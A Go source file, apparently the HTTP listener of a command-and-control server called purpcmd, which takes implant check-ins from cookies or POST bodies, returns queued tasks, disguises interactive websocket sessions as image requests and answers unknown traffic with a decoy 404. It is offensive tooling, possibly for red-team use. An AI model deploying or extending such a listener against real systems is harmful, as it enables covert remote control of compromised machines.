package listener

import (
	"errors"
	"fmt"
	"io"
	"net/http"
	"strings"

	"purpcmd/internal"
	"purpcmd/server/callback"
	"purpcmd/server/interactive"
	"purpcmd/server/log"
	"purpcmd/server/utils"

	"github.com/gorilla/websocket"
)

var errUnsupportedCallbackMethod = errors.New("unsupported callback method")

func (l *Listener) root(w http.ResponseWriter, r *http.Request) {
	if strings.Contains(r.URL.Path, ".png") || strings.Contains(r.URL.Path, ".jpg") || strings.Contains(r.URL.Path, ".gif") {
		up := websocket.Upgrader{}
		conn, err := up.Upgrade(w, r, nil)
		if err != nil {
			log.AsyncWriteStdoutErr(err.Error())
			return
		}

		webSockConn := utils.New(conn)
		log.AsyncWriteStdoutInfo("implant connected to interactive stream broker")
		if err := interactive.Default.AttachImplant(r.URL.Query().Get("stream"), webSockConn); err != nil {
			log.AsyncWriteStdoutErr(err.Error())
			_ = webSockConn.Close()
		}
		return
	}

	a, task, err := l.processPayload(w, r)
	if err != nil {
		status := http.StatusBadRequest
		if errors.Is(err, errUnsupportedCallbackMethod) {
			status = http.StatusMethodNotAllowed
			w.Header().Set("Allow", "GET, POST")
		}
		log.PrintErr("Rejected callback: ", err)
		http.Error(w, http.StatusText(status), status)
		return
	}

	if uint16(a) == internal.NIL {
		w.WriteHeader(404)
		w.Write([]byte("Page Not Found"))
		return
	} else if uint16(a) == internal.REG {
		l.incrementAssociation()
	}

	w.WriteHeader(200)

	if len(task) >= 8 {
		w.Write(task)
		return
	}
	w.Write([]byte("Hi!"))
}

func (l *Listener) processPayload(w http.ResponseWriter, r *http.Request) (uint16, []byte, error) {
	var data []byte

	name := r.URL.Query().Get("a")

	switch r.Method {
	case http.MethodGet:
		cookie, err := r.Cookie("a")
		if err != nil {
			return internal.NIL, nil, fmt.Errorf("%w: missing callback cookie", callback.ErrMalformedPayload)
		}
		data = []byte(cookie.Value)
	case http.MethodPost:
		r.Body = http.MaxBytesReader(w, r.Body, callback.MaxEncodedPayloadSize)
		var err error
		data, err = io.ReadAll(r.Body)
		if err != nil {
			return internal.NIL, nil, fmt.Errorf("%w: read callback body: %v", callback.ErrMalformedPayload, err)
		}
	default:
		return internal.NIL, nil, errUnsupportedCallbackMethod
	}

	transport := l.Proto
	if transport == "" {
		transport = "http"
	}
	return callback.ParseCallbackWithContext(data, callback.TransportContext{
		ListenerName: l.Name, ListenerUUID: l.UUID, Transport: transport, RemoteAddress: r.RemoteAddr,
	}, name)
}
